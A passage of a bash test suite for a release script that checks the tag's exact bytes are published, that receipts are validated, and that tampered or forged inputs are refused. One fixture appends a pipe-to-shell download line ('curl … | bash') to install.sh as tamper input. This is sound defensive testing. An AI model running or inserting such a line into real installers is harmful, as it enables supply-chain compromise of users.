if [ "$rc" -eq 0 ] && grep -Fq "tag $NEW_TAG (${BUMP:0:12})" "$BASE.out" && grep -Fq 'not this working tree' "$BASE.out"; then
  ok "nothing landed: --npm-only --dry-run says it would publish the tag's files, not the working tree"
else
  bad "nothing landed: --npm-only --dry-run does not say where the publish would come from (rc=$rc)"; tail_of "$BASE.out" 12
fi

# ── [3] The tag is graded and shipped — nothing after it is read ──────────────
echo "[3] commits and edits after the tag do not matter"
variant journal-after
mkdir -p "$V/.planning/journal" && printf 'entry\n' > "$V/.planning/journal/2026-10-13-haid_after.md"
commit_paths "$V" "journal: [COMMUNICATION] after the release" .planning/journal/2026-10-13-haid_after.md
T="$(tag_commit "$V")"
expect_accepted "journal-only commit after the tag" "$V" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12})"
published_equals "journal-only commit after the tag" "$V" "$T"

# A CODE commit after the tag: it changes a published file, adds one, and edits install.sh. HEAD is no longer what the
# receipt proves, but the tag still is — and what ships is the tag's files, not HEAD's.
variant code-after
printf 'a later change\n' >> "$V/packages/runheimdall/README.md"
printf 'module.exports = 1;\n' > "$V/packages/runheimdall/late.js"
printf '# edited after the release\n' >> "$V/install.sh"
printf '%s\n' "$HMD_BIN_NO_ATTACK" > "$V/bin/heimdall"
commit_all "$V" "fix: landed after the release"
T="$(tag_commit "$V")"
if [ "$(files_of "$V" HEAD runheimdall)" != "$(files_of "$V" "$T" runheimdall)" ] \
   && [ "$(git -C "$V" show HEAD:install.sh | sha256_stdin)" != "$(git -C "$V" show "$T:install.sh" | sha256_stdin)" ] \
   && [ "$(git -C "$V" show HEAD:bin/heimdall)" != "$(git -C "$V" show "$T:bin/heimdall")" ]; then
  ok "code commit after the tag: HEAD really differs from the tag in packages/, install.sh and bin/heimdall (the content checks below are not vacuous)"
else
  bad "code commit after the tag: the fixture did not make HEAD differ from the tag"
fi
expect_accepted "code commit after the tag" "$V" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12})"
if grep -Fq "dispatches no 'attack' subcommand" "$V.out"; then
  bad "code commit after the tag: the default-command notice read HEAD's bin/heimdall (no attack), not the tag's"; tail_of "$V.out" 12
else
  ok "code commit after the tag: the default-command notice read the tag's bin/heimdall (HEAD's no longer dispatches attack)"
fi
published_equals "code commit after the tag" "$V" "$T"
published_from_a_throwaway_dir "code commit after the tag" "$V"
expect_accepted "code commit after the tag" "$V" --release-only "Released $NEW_TAG" "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12})"
signed_install_is "code commit after the tag" "$V" "$T"
if [ "$(cat "$V.sign/signed-sha256" 2>/dev/null)" != "$(git -C "$V" show HEAD:install.sh | sha256_stdin)" ]; then
  ok "code commit after the tag: the signature is NOT over HEAD's install.sh"
else
  bad "code commit after the tag: the signed bytes are HEAD's install.sh, not the tag's"
fi
if grep -Fxq 'release-manifest.json' "$V.gh/assets" 2>/dev/null && grep -Fxq 'install.sh.minisig' "$V.gh/assets" 2>/dev/null; then
  ok "code commit after the tag: the signature and the release manifest were both attached"
else
  bad "code commit after the tag: the Release assets are not the signature and the manifest"; cat "$V.gh/assets" >&2
fi
if [ -z "$(ls -A "$V.tmp" 2>/dev/null)" ]; then ok "code commit after the tag: --release-only left nothing in its temp directory"; else bad "code commit after the tag: --release-only left files in its temp directory"; fi

# An UNCOMMITTED edit under packages/ — a changed file, an untracked file, a renamed package — must not leak in.
variant dirty-tree
printf 'tampered after the release\n' >> "$V/packages/runheimdall/README.md"
printf 'leak\n' > "$V/packages/runheimdall/leak.txt"
jq '.name = "evil"' "$V/packages/runhmd/package.json" > "$V/pkg.tmp" && mv "$V/pkg.tmp" "$V/packages/runhmd/package.json"
T="$(tag_commit "$V")"
expect_accepted "uncommitted edits under packages/" "$V" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12})"
published_equals "uncommitted edits under packages/" "$V" "$T"
if [ ! -e "$V.npm/published-evil-$NEW_VER" ] && [ -e "$V.npm/published-runhmd-$NEW_VER" ]; then
  ok "uncommitted edits under packages/: the tag's package name shipped, the edited one did not"
else
  bad "uncommitted edits under packages/: the working tree's package.json leaked into the publish"; ls "$V.npm" >&2
fi

# ── [4] Other shapes that are accepted ────────────────────────────────────────
echo "[4] other accepted shapes"
variant release-only
T="$(tag_commit "$V")"
expect_accepted "tagged bump" "$V" --release-only "Released $NEW_TAG" "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12})"
signed_install_is "tagged bump" "$V" "$T"

variant changelog-heading
sed "s/^## \[Unreleased\]\$/## [$NEW_VER] - 2026-10-13/" "$V/CHANGELOG.md" > "$V/CHANGELOG.md.new" && mv "$V/CHANGELOG.md.new" "$V/CHANGELOG.md"
git -C "$V" add CHANGELOG.md && amend_bump "$V" --no-edit
T="$(tag_commit "$V")"
expect_accepted "CHANGELOG release heading only" "$V" --npm-only "npm reconciled to $NEW_VER" "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12})"

variant exact
write_receipt "$V" "$(git -C "$V" rev-parse HEAD)" "$V.home"
T="$(tag_commit "$V")"
expect_accepted "receipt re-recorded at the bump" "$V" --npm-only "npm reconciled to $NEW_VER" \
  "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12}): it graded the tagged commit itself"

# The orphan recovery: the ship died between the bump and the tag. There is no tagged commit to grade, so --release-only needs the receipt to cover HEAD itself, as a full ship
# does, and then tags HEAD and signs HEAD's install.sh.
variant create-tag
git -C "$V" tag -d "$NEW_TAG" >/dev/null
HEAD_SHA="$(git -C "$V" rev-parse HEAD)"
write_receipt "$V" "$HEAD_SHA" "$V.home"
expect_accepted "tag never created, receipt at HEAD" "$V" --release-only "Released $NEW_TAG" "green FULL sweep receipt at HEAD (${HEAD_SHA:0:12})"
if [ "$(git -C "$V" rev-parse "refs/tags/$NEW_TAG^{commit}" 2>/dev/null)" = "$HEAD_SHA" ]; then
  ok "tag never created: the run tagged HEAD"
else
  bad "tag never created: the run did not create $NEW_TAG at HEAD"
fi
signed_install_is "tag never created" "$V" "$HEAD_SHA"

# The tagged commit has no bin/heimdall at all (and journal commits sit between the receipt and the bump): nothing of it is exported, and the notice says so.
BASE2="$WORK/base2"
make_fixture "$BASE2" 1 0 || { echo "FATAL: could not build the second fixture repo" >&2; exit 2; }
BASE2_RECEIPT_SHA="$FX_RECEIPT_SHA"
run_ship "$BASE2" --no-npm; rc=$?
if [ "$rc" -eq 0 ] && [ "$(git -C "$BASE2" rev-parse HEAD~2)" = "$BASE2_RECEIPT_SHA" ]; then
  ok "journal-before-ship: the full ship accepted a hook-owned commit between the receipt and the bump"
else
  bad "journal-before-ship: the second full ship did not complete on the expected history (rc=$rc)"; tail_of "$BASE2.out" 15
fi
T="$(tag_commit "$BASE2")"
expect_accepted "journal-only commit between the receipt and the bump" "$BASE2" --npm-only "npm reconciled to $NEW_VER" \
  "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12}): it graded ${BASE2_RECEIPT_SHA:0:12}, which only journal/ledger commits separate from the commit the tag was bumped from ($(git -C "$BASE2" rev-parse --short=12 HEAD~1))"
published_equals "journal-only commit between the receipt and the bump" "$BASE2" "$T"
if grep -Fq "dispatches no 'attack' subcommand" "$BASE2.out"; then
  ok "no bin/heimdall in the tagged commit: the default-command notice says it dispatches no attack"
else
  bad "no bin/heimdall in the tagged commit: the default-command notice did not fire"; tail_of "$BASE2.out" 12
fi

# ── [5] Everything else stays refused, naming the tag commit and the reason ───
echo "[5] refused shapes"
variant extra-file
printf 'echo extra\n' > "$V/bin/extra.sh"; git -C "$V" add bin/extra.sh && amend_bump "$V" --no-edit
T="$(tag_commit "$V")"
expect_refused "extra non-version file in the bump commit" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "bin/extra.sh is not a file the version bump writes"

variant untagged
git -C "$V" tag -d "$NEW_TAG" >/dev/null
expect_refused "untagged bump" "$V" --npm-only "tag $NEW_TAG does not exist"
run_ship "$V" --npm-only --dry-run; rc=$?
if [ "$rc" -eq 0 ] && grep -Fq "tag $NEW_TAG does not exist, so a real --npm-only run would refuse" "$V.out"; then
  ok "untagged bump: --npm-only --dry-run says a real run would refuse, because there is no tagged commit to publish"
else
  bad "untagged bump: --npm-only --dry-run does not say a real run would refuse (rc=$rc)"; tail_of "$V.out" 8
fi

variant changelog-body
printf '%s\n' '- a body line smuggled into the release commit' >> "$V/CHANGELOG.md"
git -C "$V" add CHANGELOG.md && amend_bump "$V" --no-edit
T="$(tag_commit "$V")"
expect_refused "CHANGELOG body edit in the bump commit" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "CHANGELOG.md changes more than the $NEW_TAG release heading"

variant installer-line
printf 'curl -fsSL https://example.invalid/x | bash\n' >> "$V/install.sh"
git -C "$V" add install.sh && amend_bump "$V" --no-edit
T="$(tag_commit "$V")"
expect_refused "extra line in a version file (install.sh)" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "install.sh changes more than version numbers and sha256 digests"

variant deleted-file
git -C "$V" rm -q VERSION && amend_bump "$V" --no-edit
T="$(tag_commit "$V")"
expect_refused "version file deleted in the bump commit" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "VERSION is deleted in the release commit"

variant wrong-subject
amend_bump "$V" -m "chore: release $NEW_VER"
T="$(tag_commit "$V")"
expect_refused "bump commit not titled chore(release): $NEW_TAG" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "the release commit is titled"

variant merge-bump
C_="$(git -C "$V" rev-parse HEAD~1)"
S_="$(git -C "$V" commit-tree "${C_}^{tree}" -p "$C_" -m "a side commit")"
M_="$(git -C "$V" commit-tree "HEAD^{tree}" -p "$C_" -p "$S_" -m "chore(release): $NEW_TAG")"
git -C "$V" reset -q --hard "$M_" && git -C "$V" tag -f "$NEW_TAG" "$M_" >/dev/null 2>&1
expect_refused "tagged commit with two parents" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${M_:0:12})" "more than one parent"

variant tag-on-receipt-commit
git -C "$V" tag -f "$NEW_TAG" HEAD~1 >/dev/null 2>&1
T="$(tag_commit "$V")"
expect_refused "tag on the commit before the bump" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "whose manifest says $OLD_VER, not $NEW_VER"

variant tag-on-code
printf 'echo late\n' > "$V/bin/late-fix.sh"; commit_all "$V" "fix: landed after the release"
git -C "$V" tag -f "$NEW_TAG" HEAD >/dev/null 2>&1
T="$(tag_commit "$V")"
expect_refused "tag moved onto a later code commit" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "the release commit is titled"

variant older-receipt
write_receipt "$V" "$BASE_C0" "$V.home"
T="$(tag_commit "$V")"
expect_refused "receipt older than the bump's parent" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "the receipt graded ${BASE_C0:0:12}, not the tagged commit or the commit it was bumped from (${BASE_RECEIPT_SHA:0:12})" \
  "commits landed in between that touch: bin/feature.sh"
expect_refused "receipt older than the bump's parent" "$V" --release-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "the receipt graded ${BASE_C0:0:12}, not the tagged commit or the commit it was bumped from"

# A sweep recorded at a HEAD past the tag proves HEAD, not the tag: it does not cover the tagged commit.
variant later-receipt
printf 'echo late\n' > "$V/bin/late-fix.sh"; commit_all "$V" "fix: landed after the release"
LATE="$(git -C "$V" rev-parse HEAD)"
write_receipt "$V" "$LATE" "$V.home"
T="$(tag_commit "$V")"
expect_refused "receipt graded a commit past the tag" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "the receipt graded ${LATE:0:12}, which is not an ancestor of ${BASE_RECEIPT_SHA:0:12}"

# The tag names a commit that no longer holds packages/ (and a sweep graded that commit itself): the receipt covers it, but there is nothing to export, so nothing is published.
variant no-packages
git -C "$V" rm -rq packages && git -C "$V" commit -q -m "chore: drop the wrappers" && git -C "$V" tag -f "$NEW_TAG" HEAD >/dev/null 2>&1
write_receipt "$V" "$(git -C "$V" rev-parse HEAD)" "$V.home"
T="$(tag_commit "$V")"
expect_refused "tagged commit without packages/" "$V" --npm-only "could not export packages of ${T:0:12}"

variant release-only-untagged
git -C "$V" tag -d "$NEW_TAG" >/dev/null
expect_refused "--release-only with the tag never created" "$V" --release-only \
  "tag $NEW_TAG does not exist yet" "receipt is STALE: it graded ${BASE_RECEIPT_SHA:0:12}"
if [ -z "$(git -C "$V" tag --list "$NEW_TAG")" ]; then
  ok "release-only (untagged): the refused run did not create the tag"
else
  bad "release-only (untagged): a refused run still tagged $NEW_TAG"
fi

# The post-tag rule is for the recovery modes only: a NEW full ship grades the commit it is about to bump, and
# right after a release that commit is the bump itself, which no sweep has seen.
variant second-ship
BEFORE="$(git -C "$V" rev-parse HEAD)"
run_ship "$V" --no-npm; rc=$?
if [ "$rc" -ne 0 ] && grep -Fq 'receipt is STALE' "$V.out" && ! grep -Fq 'STALE for tag' "$V.out" \
   && [ "$(git -C "$V" rev-parse HEAD)" = "$BEFORE" ]; then
  ok "a second full ship is still refused on the pre-bump receipt, strictly: the tag rule is post-tag only, nothing was bumped"
else
  bad "a second full ship was not refused strictly (rc=$rc)"; tail_of "$V.out" 12
fi

# ── [6] What is published must BE the tag's bytes ─────────────────────────────
echo "[6] an export that is not the commit's own bytes is refused"
variant export-ignore
printf 'packages/runheimdall/README.md export-ignore\n' >> "$V/.git/info/attributes"
T="$(tag_commit "$V")"
expect_refused "a file dropped from the export (export-ignore)" "$V" --npm-only \
  "the export of ${T:0:12} is not byte-identical to the commit" "packages/runheimdall/README.md was not written"

variant export-eol
printf 'packages/runheimdall/README.md text eol=crlf\n' >> "$V/.git/info/attributes"
T="$(tag_commit "$V")"
expect_refused "a file rewritten by the export (eol=crlf)" "$V" --npm-only \
  "the export of ${T:0:12} is not byte-identical to the commit" "packages/runheimdall/README.md differs"

# ── [7] --release-only reads the tag for the manifest it uploads, too ─────────
echo "[7] --release-only: the release manifest must describe the tag's install.sh"
variant manifest-tamper
jq --arg sha "$ZERO_SHA" '.install_sha256 = $sha' "$V/.heimdall/release/release-manifest.json" > "$V/manifest.tmp" \
  && mv "$V/manifest.tmp" "$V/.heimdall/release/release-manifest.json"
run_ship "$V" --release-only; rc=$?
if [ "$rc" -ne 0 ] && grep -Fq "describes install.sh sha256 $ZERO_SHA" "$V.out" && ! grep -Fxq 'release-manifest.json' "$V.gh/assets" 2>/dev/null \
   && [ -z "$(ls -A "$V.tmp" 2>/dev/null)" ]; then
  ok "a manifest describing other install.sh bytes is refused, not uploaded, and the run's temp directory is gone (rc=$rc)"
else
  bad "a manifest for the wrong install.sh bytes was accepted or not reported (rc=$rc)"; tail_of "$V.out" 10; ls -A "$V.tmp" >&2
fi

# ── [8] A failed publish still leaves nothing behind ──────────────────────────
echo "[8] cleanup"
variant failed-publish
T="$(tag_commit "$V")"
FAIL_PUBLISH=1; run_ship "$V" --npm-only; rc=$?; FAIL_PUBLISH=""
cwd="$(cat "$V.npm/cwd-runheimdall" 2>/dev/null || true)"
if [ "$rc" -ne 0 ] && [ -n "$cwd" ] && [ ! -e "$cwd" ] && [ -z "$(ls -A "$V.tmp" 2>/dev/null)" ]; then
  ok "a publish that fails (rc=$rc) still removes the export it ran in"
else
  bad "a failed publish left its export behind (rc=$rc, cwd='$cwd')"; tail_of "$V.out" 8; ls -A "$V.tmp" >&2
fi

# ── [9] Reality check: the newest REAL bump commit of this repo obeys the same shape rule ──
echo "[9] the real release history"
REAL_BUMP="$(git -C "$REPO" log -1 --format=%H --grep='^chore(release): v[0-9]' 2>/dev/null)"
if [ "$(git -C "$REPO" rev-parse --is-shallow-repository 2>/dev/null)" = "true" ] || [ -z "$REAL_BUMP" ]; then
  echo "  SKIP no complete release history in this checkout (shallow clone, or no chore(release) commit)"
else
  # shellcheck disable=SC1090 # $SHIP is the file under test; the SHIP_SOURCE_ONLY seam defines its functions and runs nothing
  WHY="$( cd "$REPO" && SHIP_SOURCE_ONLY=1 . "$SHIP" && release_commit_pins_only "$REAL_BUMP" )"; rc=$?
  if [ "$rc" -eq 0 ]; then
    ok "the newest real bump commit (${REAL_BUMP:0:12}) satisfies the shape rule — the allowlist matches reality"
  else
    bad "the newest real bump commit (${REAL_BUMP:0:12}) fails the shape rule: ${WHY:-<no reason>} — extend RELEASE_BUMP_PATHS together with the bump"
  fi
fi

# ── [10] The archive, read: the anchor moves on, the tag's own sweep is still on file ────────
echo "[10] archived receipts (receipts/full-green/<head_sha>.json), under the same checks as the anchor"

# The defect, reproduced: the release was swept green, a sweep of later main replaced last-full-green.json, and --npm-only died "receipt is STALE for tag ...". With no archive that is still the answer,
# so every acceptance below is the archive's doing. Archives of OTHER commits do not rescue the tag, and the refusal names them.
variant archive-parent
moved_on "$V"
LATE="$(git -C "$V" rev-parse HEAD)"; T="$(tag_commit "$V")"
if [ "$(files_of "$V" HEAD runheimdall)" != "$(files_of "$V" "$T" runheimdall)" ]; then
  ok "anchor moved on: HEAD really differs from the tag in packages/ (the content check below is not vacuous)"
else
  bad "anchor moved on: the fixture did not make HEAD differ from the tag"
fi
expect_refused "the anchor moved on, no archive" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "the receipt graded ${LATE:0:12}, which is not an ancestor of ${BASE_RECEIPT_SHA:0:12}"
if grep -Fq 'full-green' "$V.out"; then
  bad "the anchor moved on, no archive: the refusal talks about an archive that does not exist"
else
  ok "the anchor moved on, no archive: the refusal does not mention an archive (there is none, so the text is the one it always was)"
fi
write_archive "$V" "$BASE_C0" "$V.home"
write_archive "$V" "$LATE" "$V.home"
expect_refused "archives of other commits only" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" \
  "${BASE_C0}.json: the receipt graded ${BASE_C0:0:12}, not the tagged commit or the commit it was bumped from (${BASE_RECEIPT_SHA:0:12})" \
  "${LATE}.json: the receipt graded ${LATE:0:12}, which is not an ancestor of ${BASE_RECEIPT_SHA:0:12}"
write_archive "$V" "$BASE_RECEIPT_SHA" "$V.home"
expect_accepted "archive of the commit the tag was bumped from" "$V" --npm-only "npm reconciled to $NEW_VER" \
  "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12}): it graded the commit the tag was bumped from (${BASE_RECEIPT_SHA:0:12})"
if grep -Fq "full-green/${BASE_RECEIPT_SHA}.json" "$V.out"; then
  ok "archive of the commit the tag was bumped from: the run says which archived receipt it rested on"
else
  bad "archive of the commit the tag was bumped from: the run does not name the archived receipt"; tail_of "$V.out" 8
fi
published_equals "archive of the commit the tag was bumped from" "$V" "$T"
published_from_a_throwaway_dir "archive of the commit the tag was bumped from" "$V"
expect_accepted "archive of the commit the tag was bumped from" "$V" --release-only "Released $NEW_TAG" \
  "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12}): it graded the commit the tag was bumped from (${BASE_RECEIPT_SHA:0:12})"

# A sweep recorded at the bump itself, and a sweep that journal commits separate from the commit the tag was bumped from (the shape of nearly every real release here: hooks journal while the sweep runs).
variant archive-tagged
moved_on "$V"; T="$(tag_commit "$V")"
write_archive "$V" "$T" "$V.home"
expect_accepted "archive of the tagged commit itself" "$V" --npm-only "npm reconciled to $NEW_VER" \
  "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12}): it graded the tagged commit itself"

variant archive-journal-gap "$BASE2" "$BASE2_RECEIPT_SHA"
moved_on "$V"; T="$(tag_commit "$V")"; P1="$(git -C "$V" rev-parse "${T}^")"
write_archive "$V" "$BASE2_RECEIPT_SHA" "$V.home"
expect_accepted "archive across a journal commit" "$V" --npm-only "npm reconciled to $NEW_VER" \
  "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12}): it graded ${BASE2_RECEIPT_SHA:0:12}, which only journal/ledger commits separate from the commit the tag was bumped from (${P1:0:12})"

# A red archived receipt rescues nothing, whichever way it is red.
variant archive-red
moved_on "$V"; T="$(tag_commit "$V")"
red_cases=(
  'exit_code 1|.exit_code = 1|is not a green, clean full sweep'
  'a dirty tree|.tree_clean = false|is not a green, clean full sweep'
  'an incremental receipt|.kind = "incremental"|is not a green, clean full sweep'
  'an aborted run|.kind = "aborted"|is from an ABORTED run'
)
for c in "${red_cases[@]}"; do
  IFS='|' read -r label edit reason <<<"$c"
  write_archive "$V" "$BASE_RECEIPT_SHA" "$V.home" "$BASE_RECEIPT_SHA" "$edit"
  expect_refused "archived receipt, $label" "$V" --npm-only \
    "receipt is STALE for tag $NEW_TAG (${T:0:12})" "receipts/full-green/${BASE_RECEIPT_SHA}.json" "$reason"
done
write_archive "$V" "$BASE_RECEIPT_SHA" "$V.home" "$BASE_RECEIPT_SHA" '.exit_code = 1'
expect_refused "archived receipt, exit_code 1" "$V" --release-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "is not a green, clean full sweep"

# Another repo's receipt rescues nothing.
variant archive-other-repo
moved_on "$V"; T="$(tag_commit "$V")"
write_archive "$V" "$BASE_RECEIPT_SHA" "$V.home" "$BASE_RECEIPT_SHA" '.repo = "/somewhere/else/heimdall"'
expect_refused "archived receipt recorded for another repo" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "receipts/full-green/${BASE_RECEIPT_SHA}.json was recorded for a different repo"

# Forged receipts rescue nothing: one filed under the name of a commit it did not grade (it WOULD cover the tag if the name were ignored), and one whose cache block the engine cannot vouch for.
variant archive-forged
moved_on "$V"; T="$(tag_commit "$V")"; LATE="$(git -C "$V" rev-parse HEAD)"
write_archive "$V" "$BASE_RECEIPT_SHA" "$V.home" "$LATE"
expect_refused "archived receipt filed under another commit's name" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "${LATE}.json is filed under a commit it did not grade (it graded ${BASE_RECEIPT_SHA:0:12})"
rm -f "$V.home/receipts/full-green/$LATE.json"
write_archive "$V" "$BASE_RECEIPT_SHA" "$V.home" "$BASE_RECEIPT_SHA" '.cache = {mode:"closure", cold:false}'
expect_refused "archived receipt with a cache block and no engine to verify it" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" "carries a suite-cache block and bin/heimdall-suite-closure is not here to verify it"
install_engine "$V"
printf 'forged\n' > "$V.home/closure-verdict"; rm -f "$V.home/closure-stub.log"
expect_refused "archived receipt the engine calls forged" "$V" --npm-only \
  "receipt is STALE for tag $NEW_TAG (${T:0:12})" \
  "receipts/full-green/${BASE_RECEIPT_SHA}.json does not verify (bin/heimdall-suite-closure verify-receipt): suite a.test.sh: closure_sha does not match"
if grep -Fq -- "verify-receipt --repo" "$V.home/closure-stub.log" 2>/dev/null \
   && grep -Fq -- "--receipt $V.home/receipts/full-green/${BASE_RECEIPT_SHA}.json" "$V.home/closure-stub.log" 2>/dev/null; then
  ok "archived receipt the engine calls forged: the engine was asked about the archived receipt itself"
else
  bad "archived receipt the engine calls forged: the engine was not asked to verify the archived receipt"; cat "$V.home/closure-stub.log" >&2 2>/dev/null || true
fi
printf 'ok\n' > "$V.home/closure-verdict"
expect_accepted "the same archived receipt, vouched for by the engine" "$V" --npm-only "npm reconciled to $NEW_VER" \
  "green FULL sweep receipt covers tag $NEW_TAG (${T:0:12}): it graded the commit the tag was bumped from (${BASE_RECEIPT_SHA:0:12})"

# The cold rule of an x.y.0 release: an archived receipt composed from the suite cache is not enough, a cold one is.
variant archive-cold
x_y_0 "$V"
moved_on "$V"
T="$(git -C "$V" rev-parse "refs/tags/v9.10.0^{commit}")"
install_engine "$V"
printf 'ok\n' > "$V.home/closure-verdict"
write_archive "$V" "$BASE_RECEIPT_SHA" "$V.home" "$BASE_RECEIPT_SHA" '.cache = {mode:"closure", cold:false}'
expect_refused "archived cache-composed receipt for an x.y.0 release" "$V" --npm-only \
  "receipt is STALE for tag v9.10.0 (${T:0:12})" "needs a COLD sweep receipt" "receipts/full-green/${BASE_RECEIPT_SHA}.json was composed from the suite cache"
write_archive "$V" "$BASE_RECEIPT_SHA" "$V.home" "$BASE_RECEIPT_SHA" '.cache = {mode:"closure", cold:true}'
run_ship "$V" --npm-only
if grep -Fq "green FULL sweep receipt covers tag v9.10.0 (${T:0:12}): it graded the commit the tag was bumped from (${BASE_RECEIPT_SHA:0:12})" "$V.out"; then
  ok "archived cold receipt for an x.y.0 release: accepted"
else
  bad "archived cold receipt for an x.y.0 release: not accepted"; tail_of "$V.out" 8
fi

# ── [11] The archive, written: the REAL test/run-all.sh files it ──────────────────────────────
echo "[11] test/run-all.sh files a copy of every green FULL receipt and keeps the newest 20"
SW="$WORK/sweep"; ARCH="$SW/.heimdall/receipts/full-green"; ANCHOR="$SW/.heimdall/receipts/last-full-green.json"
if ! { mkdir -p "$SW/test" "$SW/bin/lib" "$SW.home" "$SW.tmp" \
       && cp "$REPO/test/run-all.sh" "$SW/test/run-all.sh" && cp "$REPO/bin/lib/hook-owned-path.sh" "$SW/bin/lib/hook-owned-path.sh"; }; then
  echo "FATAL: could not build the sweep fixture" >&2; exit 2
fi
printf '%s\n' '#!/usr/bin/env bash' 'echo "1 passed, 0 failed"' > "$SW/test/alpha.test.sh"
# shellcheck disable=SC2016 # fixture suite text: the single-quoted "${FAIL_SUITE:-}" is literal source for the fixture suite, never an expansion here
printf '%s\n' '#!/usr/bin/env bash' '[ "${FAIL_SUITE:-}" = beta ] && { echo "  FAIL beta"; echo "0 passed, 1 failed"; exit 1; }' 'echo "1 passed, 0 failed"' > "$SW/test/beta.test.sh"
printf '.heimdall/\n' > "$SW/.gitignore"
if ! { git init -q "$SW" && git -C "$SW" config user.email "t@example.com" && git -C "$SW" config user.name "T" && git -C "$SW" config commit.gpgsign false \
       && git -C "$SW" add -A && git -C "$SW" commit -q -m "fixture"; }; then
  echo "FATAL: could not commit the sweep fixture" >&2; exit 2
fi

# sweep <repo> [<suite to turn red>] — the REAL test/run-all.sh in a fixture repo of its own (its own HOME and TMPDIR, no HEIMDALL_HOME: its receipts land in <repo>/.heimdall/receipts, which .gitignore hides).
# Output in SW_OUT, exit code in SW_RC.
sweep() {
  SW_OUT="$( cd "$1" && env -u HEIMDALL_HOME HOME="$1.home" TMPDIR="$1.tmp" HMD_NO_CAFFEINATE=1 FAIL_SUITE="${2:-}" bash test/run-all.sh --min 1 --jobs 1 2>&1 )"; SW_RC=$?
}
next_commit() { printf '# %s\n' "$RANDOM$RANDOM" >> "$1/test/alpha.test.sh"; commit_all "$1" "change"; }   # <repo> — a new HEAD to sweep
archived() { find "$ARCH" -type f -name '*.json' 2>/dev/null | wc -l | tr -d ' '; }                         # how many receipts the archive holds

sweep "$SW"; HEAD1="$(git -C "$SW" rev-parse HEAD)"
if [ "$SW_RC" -eq 0 ] && [ -f "$ARCH/$HEAD1.json" ] && cmp -s "$ARCH/$HEAD1.json" "$ANCHOR" \
   && [ "$(jq -r '[.head_sha, .kind, .exit_code, (.tree_clean | tostring)] | join(",")' "$ARCH/$HEAD1.json" 2>/dev/null)" = "$HEAD1,full,0,true" ]; then
  ok "a green full sweep files its receipt as full-green/<head_sha>.json, byte for byte the anchor it just wrote"
else
  bad "a green full sweep did not file its receipt as full-green/<head_sha>.json (rc=$SW_RC)"; printf '%s\n' "$SW_OUT" | tail -n 12 | sed 's/^/      | /' >&2
fi
if [ "$(find "$ARCH" -mindepth 1 2>/dev/null | wc -l | tr -d ' ')" = 1 ] && printf '%s' "$SW_OUT" | grep -Fq "full-green/$HEAD1.json"; then
  ok "the copy is written atomically (no temp file is left in the archive) and the run names it"
else
  bad "the archive holds more than the one receipt, or the run does not name it"; find "$ARCH" >&2 2>/dev/null || true
fi

cp "$ANCHOR" "$SW.anchor1"
next_commit "$SW"; sweep "$SW"; HEAD2="$(git -C "$SW" rev-parse HEAD)"
if [ "$SW_RC" -eq 0 ] && [ "$(jq -r .head_sha "$ANCHOR")" = "$HEAD2" ] && [ -f "$ARCH/$HEAD2.json" ] && cmp -s "$ARCH/$HEAD1.json" "$SW.anchor1"; then
  ok "the anchor moves on to the next green sweep and the first sweep's receipt stays on file, unchanged (the defect: it used to be gone)"
else
  bad "the first sweep's receipt did not survive the next sweep (rc=$SW_RC)"; printf '%s\n' "$SW_OUT" | tail -n 12 | sed 's/^/      | /' >&2
fi

next_commit "$SW"; sweep "$SW" beta; HEAD3="$(git -C "$SW" rev-parse HEAD)"
if [ "$SW_RC" -ne 0 ] && [ ! -e "$ARCH/$HEAD3.json" ] && [ "$(jq -r .head_sha "$ANCHOR")" = "$HEAD2" ] && [ "$(archived)" = 2 ]; then
  ok "a red sweep files nothing and leaves the anchor where it was"
else
  bad "a red sweep touched the archive or the anchor (rc=$SW_RC, archive holds $(archived))"; printf '%s\n' "$SW_OUT" | tail -n 12 | sed 's/^/      | /' >&2
fi

# 25 receipts of old sweeps (modification times in 2020, oldest first) + the two real ones + the next sweep's = 28; the newest 20 stay.
mkdir -p "$ARCH" || { echo "FATAL: could not create $ARCH" >&2; exit 2; }
i=1
while [ "$i" -le 25 ]; do
  f="$ARCH/$(printf '%040d' "$i").json"
  if ! { printf '{}\n' > "$f" && touch -t "20200101$(printf '00%02d' "$i")" "$f"; }; then echo "FATAL: could not seed $f" >&2; exit 2; fi
  i=$((i + 1))
done
next_commit "$SW"; sweep "$SW"; HEAD4="$(git -C "$SW" rev-parse HEAD)"
pruned_right=1; i=1
while [ "$i" -le 25 ]; do
  f="$ARCH/$(printf '%040d' "$i").json"
  if [ "$i" -le 8 ]; then [ ! -e "$f" ] || pruned_right=0; else [ -e "$f" ] || pruned_right=0; fi
  i=$((i + 1))
done
